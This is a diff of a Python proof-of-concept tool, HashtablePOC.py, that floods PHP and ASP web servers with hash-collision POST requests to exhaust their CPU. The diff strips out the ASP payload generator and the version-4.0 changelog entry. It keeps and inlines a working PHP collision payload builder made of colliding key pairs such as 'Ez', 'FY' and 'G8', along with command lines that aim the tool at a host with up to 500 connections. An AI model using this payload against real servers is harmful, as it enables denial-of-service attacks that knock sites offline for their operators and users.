@@ -20,7 +20,6 @@ python HashtablePOC.py -u https://host/index.php -v -c 1 -w -o output -t PHP
 python HashtablePOC.py -u https://host/index.php -v -c 500 -t PHP
 
 Changelog:
-v4.0: ASP Payload Generator
 v3.0: Load Payload from file
 v2.0: Added Support for https, switched to HTTP 1.1
 v1.0: Initial Release
@@ -46,7 +45,7 @@ def main():
     parser.add_argument("-p", "--payload", dest="payload", help="Save payload to file")
     parser.add_argument("-o", "--output", dest="output", help="Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w")
     parser.add_argument("-t", "--target", dest="target", help="Target of the attack", choices=["ASP", "PHP"], required=True)
-    parser.add_argument("--version", action="version", version="%(prog)s 4.0")
+    parser.add_argument("--version", action="version", version="%(prog)s 3.0")
 
     options = parser.parse_args()
 
@@ -169,31 +168,27 @@ Content-Length: %s\r\n\
             sock.close()
 
 def generateASPPayload():
-    # entries with collisions in ASP hashtable hash function 
-    a = {"0":"tt", "1":"uU", "2":"v6"}
-    return __generatePayload__(a, 11)
+    return "a=a"
 
 def generatePHPPayload():
-    # Note: Default max POST Data Length in PHP is 8388608 bytes (8MB)
-    # entries with collisions in PHP hashtable hash function 
-    a = {"0":"Ez", "1":"FY", "2":"G8", "3":"H"+chr(23), "4":"D"+chr(122+33)}
-    return __generatePayload__(a, 7)
-
-def __generatePayload__(collisionchars, payloadlenght):
     # Taken from:
     # https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision
+
+    # Note: Default max POST Data Length in PHP is 8388608 bytes (8MB)
     
+    # entries with collisions in PHP hashtable hash function 
+    a = {"0":"Ez", "1":"FY", "2":"G8", "3":"H"+chr(23), "4":"D"+chr(122+33)}
     # how long should the payload be
-    length = payloadlenght
-    size = len(collisionchars)
+    length = 7
+    size = len(a)
     post = ""
     maxvaluefloat = math.pow(size,length)
     maxvalueint = int(math.floor(maxvaluefloat))
     for i in range (maxvalueint):
         inputstring = base_convert(i, size)
         result = inputstring.rjust(length, "0")
-        for item in collisionchars:
-            result = result.replace(item, collisionchars[item])
+        for item in a:
+            result = result.replace(item, a[item])
         post += "" + urllib.quote(result) + "=&"
 
     return post;
